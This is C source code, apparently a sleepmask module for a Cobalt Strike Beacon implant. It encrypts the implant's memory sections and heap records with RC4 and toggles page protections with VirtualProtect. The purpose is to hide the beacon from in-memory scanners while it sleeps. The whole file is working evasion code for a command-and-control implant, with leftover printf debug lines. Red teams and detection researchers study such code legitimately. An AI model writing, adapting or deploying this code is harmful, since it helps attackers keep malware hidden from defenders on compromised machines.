#include <windows.h>
#include <string.h>
#include <stdio.h>
#include "../beacon.h"
#include "../base/helpers.h"
#include "../debug.h"
#include "../sleepmask.h"

PALLOCATED_MEMORY_REGION FindRegionByPurpose(PALLOCATED_MEMORY allocatedMemory, ALLOCATED_MEMORY_PURPOSE purpose);
void RC4Beacon(BEACON_INFO* beaconInfo, BOOL mask);
void MaskHeapRecords(BEACON_INFO* beaconInfo);
void RC4TrackedSections(PALLOCATED_MEMORY_REGION allocatedRegion, char* maskKey, BOOL mask);

void MaskBeacon(BEACON_INFO* beaconInfo) {
    RC4Beacon(beaconInfo, TRUE);

    return;
}

/**
* UnMask Beacon
*
* @param beaconInfo A pointer to the BEACON_INFO structure
*/
void UnMaskBeacon(BEACON_INFO* beaconInfo) {
    RC4Beacon(beaconInfo, FALSE);

    return;
}


void RC4Beacon(BEACON_INFO* beaconInfo, BOOL mask) {
    // Determine which allocated memory region contains Beacon
    PALLOCATED_MEMORY_REGION beaconMemory = FindRegionByPurpose(&beaconInfo->allocatedMemory, PURPOSE_BEACON_MEMORY);
    if (beaconMemory == NULL) {
        DLOGF("SLEEPMASK: Failed to find Beacon memory. Exiting...\n");
        return;
    }

    // Mask/UnMask the memory
    RC4TrackedSections(beaconMemory, beaconInfo->mask, mask);
    MaskHeapRecords(beaconInfo);

    return;
}


typedef struct
{
    unsigned int i;
    unsigned int j;
    unsigned char s[256];

} Rc4Context;

void rc4Init(Rc4Context* context, const unsigned char* key, size_t length)
{
    unsigned int i;
    unsigned int j;
    unsigned char temp;

    if (context == NULL || key == NULL)
        return;

    context->i = 0;
    context->j = 0;

    for (i = 0; i < 256; i++)
    {
        context->s[i] = i;
    }

    for (i = 0, j = 0; i < 256; i++)
    {
        j = (j + context->s[i] + key[i % length]) % 256;

        temp = context->s[i];
        context->s[i] = context->s[j];
        context->s[j] = temp;
    }
}

void rc4Cipher(Rc4Context* context, const unsigned char* input, unsigned char* output, size_t length)
{
    unsigned char temp;
    unsigned int i = context->i;
    unsigned int j = context->j;
    unsigned char* s = context->s;

    while (length > 0)
    {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;

        temp = s[i];
        s[i] = s[j];
        s[j] = temp;

        if (input != NULL && output != NULL)
        {
            *output = *input ^ s[(s[i] + s[j]) % 256];

            input++;
            output++;
        }

        length--;
    }

    context->i = i;
    context->j = j;
}

/**
* Encrypt the provided buffer with the provided key using RC4
*
* @param buffer The buffer to encrypt
* @param size The size of the buffer
* @param key The key to encrypt the buffer
* @param keyLength The length of the key
* @return A Boolean value to indicate success
*/
BOOL RC4Data(char* buffer, size_t size, char* key, size_t keyLength)
{
    if (buffer == NULL || key == NULL || keyLength == 0) {
        return FALSE;
    }

    Rc4Context ctx;
    rc4Init(&ctx, (unsigned char*)key, keyLength);
    rc4Cipher(&ctx, (unsigned char*)buffer, (unsigned char*)buffer, size);

    return TRUE;
}

/**
* Mask a provided region's sections
*
* @param allocatedRegion A pointer to the PALLOCATED_MEMORY_REGION structure
* @param maskKey A pointer to the mask key
* @param mask A Boolean value to indicate whether its mask/unmask
*/
void RC4TrackedSections(PALLOCATED_MEMORY_REGION allocatedRegion, char* maskKey, BOOL mask) {
    DFR_LOCAL(KERNEL32, VirtualProtect)
        for (int i = 0; i < sizeof(allocatedRegion->Sections) / sizeof(ALLOCATED_MEMORY_SECTION); i++) {
            char* baseAddress = (char*)allocatedRegion->Sections[i].BaseAddress;
            if (baseAddress == NULL) {
                return;
            }
            DLOGF("SLEEPMASK: %s Section - Address: %p\n", mask ? "Masking" : "Unmasking", allocatedRegion->Sections[i].BaseAddress);
            if (allocatedRegion->Sections[i].MaskSection == TRUE) {
                if (allocatedRegion->Sections[i].CurrentProtect == PAGE_EXECUTE_READ && mask == TRUE) {
                    VirtualProtect(baseAddress, allocatedRegion->Sections[i].VirtualSize, PAGE_READWRITE, &allocatedRegion->Sections[i].PreviousProtect);
                    allocatedRegion->Sections[i].CurrentProtect = PAGE_READWRITE;
                }

                RC4Data((char*)baseAddress, allocatedRegion->Sections[i].VirtualSize, maskKey, MASK_SIZE);

                if (allocatedRegion->Sections[i].PreviousProtect != allocatedRegion->Sections[i].CurrentProtect && mask == FALSE) {
                    allocatedRegion->Sections[i].CurrentProtect = allocatedRegion->Sections[i].PreviousProtect;
                    VirtualProtect(baseAddress, allocatedRegion->Sections[i].VirtualSize, allocatedRegion->Sections[i].PreviousProtect, &allocatedRegion->Sections[i].PreviousProtect);
                }
            }
        }

    return;
}

/**
* A wrapper around RC4TrackedSections for clarity
*
* @param allocatedRegion A pointer to the PALLOCATED_MEMORY_REGION structure
* @param maskKey A pointer to the mask key
*/
void MaskPESections(PALLOCATED_MEMORY_REGION allocatedRegion, char* maskKey) {
    RC4TrackedSections(allocatedRegion, maskKey, TRUE);
}

/**
* A wrapper around RC4TrackedSections for clarity
*
* @param allocatedRegion A pointer to the PALLOCATED_MEMORY_REGION structure
* @param maskKey A pointer to the mask key
*/
void UnMaskPESections(PALLOCATED_MEMORY_REGION allocatedRegion, char* maskKey) {

    RC4TrackedSections(allocatedRegion, maskKey, FALSE);
}

/**
* Mask Beacon's heap records
*
* @param beaconInfo A pointer to the BEACON_INFO structure
*/
void MaskHeapRecords(BEACON_INFO* beaconInfo) {
    DWORD heapRecord = 0;
    while (beaconInfo->heap_records[heapRecord].ptr != NULL) {
        printf("before masking %s \n", beaconInfo->heap_records[heapRecord].ptr);

        RC4Data(beaconInfo->heap_records[heapRecord].ptr, beaconInfo->heap_records[heapRecord].size, beaconInfo->mask, MASK_SIZE);

        printf("after masking %s \n", beaconInfo->heap_records[heapRecord].ptr);


        heapRecord++;
    }
}

/**
* A wrapper around MaskHeapRecords for clarity
*
* @param beaconInfo A pointer to the BEACON_INFO structure
*/
void UnMaskHeapRecords(BEACON_INFO* beaconInfo) {
    MaskHeapRecords(beaconInfo);
}
